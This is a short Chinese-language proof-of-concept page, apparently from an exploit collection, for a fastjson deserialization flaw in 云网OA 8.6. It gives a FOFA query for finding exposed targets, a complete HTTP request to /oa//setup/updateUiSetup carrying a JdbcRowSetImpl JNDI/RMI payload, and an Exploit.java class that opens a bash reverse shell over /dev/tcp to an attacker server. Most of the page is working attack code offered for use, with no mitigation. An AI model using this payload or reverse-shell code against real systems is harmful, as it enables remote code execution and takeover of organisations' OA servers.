## 云网OA8.6存在fastjson反序列化漏洞

云网OA8.6使用fastjson1.2.37造成反序列化漏洞

## fofa
```
"云网OA"
```

## poc
```
POST /oa//setup/updateUiSetup HTTP/1.1
Host: 192.168.0.7:8096
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: skincode=lte; name=admin; pwd=; JSESSIONID=85F37A117572BE90EA4BA0ED10F77EF5
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 196

uiSetup={"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl" }, "b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1389/Exploit", "autoCommit":true}}

```
![a8ac139413588a49d844ca534afce1ed](https://github.com/wy876/POC/assets/139549762/773d195f-9171-4783-956b-4db556f93aae)

![bb988d242c8d788aca44bd3e22f2650b](https://github.com/wy876/POC/assets/139549762/15be1a39-4102-4864-8cae-71e21e56187b)

### Exploit.java
```
public class Exploit {
    public Exploit(){
        try {
            java.lang.Runtime.getRuntime().exec(
                    new String[]{"bash", "-c", "bash -i >& /dev/tcp/服务器IP/12345 0>&1"});
        }
        catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        Exploit e = new Exploit();
    }
}
```

## 漏洞来源
- https://mp.weixin.qq.com/s/KNE7khKhG9-FLTJK73ZfNQ
